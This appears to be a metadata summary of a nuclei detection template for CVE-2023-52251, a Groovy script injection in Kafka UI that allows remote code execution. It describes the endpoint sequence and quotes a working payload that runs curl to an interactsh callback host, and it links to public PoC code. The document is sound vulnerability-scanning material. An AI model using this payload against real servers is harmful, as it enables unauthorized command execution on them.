---
cve_id: CVE-2023-52251
template_path: nuclei-templates/http/cves/2023/CVE-2023-52251.yaml
affected_product: Kafka UI
severity: high
authentication: required
external_callback: true
affected_versions: 0.4.0 through 0.7.1
preconditions: []
poc_classification: rce
---

## Vulnerability
An issue discovered in provectus kafka-ui 0.4.0 through 0.7.1 allows remote attackers to execute arbitrary code via the q parameter of /api/clusters/local/topics/{topic}/messages. Authenticated attackers can inject and execute arbitrary commands via Groovy script injection in the filterQueryType parameter. CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (score 8.8). CWE-94. Remediation: Upgrade to version 0.7.2 or later.

## PoC / Detection
Classification: rce

The template first issues GET /api/clusters to extract the name of the first cluster, then GET /api/clusters/{{cluster-name}}/topics to extract the name of the first topic. It then sends a GET /api/clusters/{{cluster-name}}/topics/{{topic-name}}/messages request containing the Groovy payload `new ProcessBuilder("curl","{{interactsh-url}}").start()` in the q parameter with filterQueryType=GROOVY_SCRIPT. Confirmation occurs via an HTTP interactsh callback and the presence of 'Assigning partitions' in the response body.

## References
- http://packetstormsecurity.com/files/177214/Kafka-UI-0.7.1-Command-Injection.html
- https://github.com/BobTheShoplifter/CVE-2023-52251-POC
- https://github.com/nomi-sec/PoC-in-GitHub
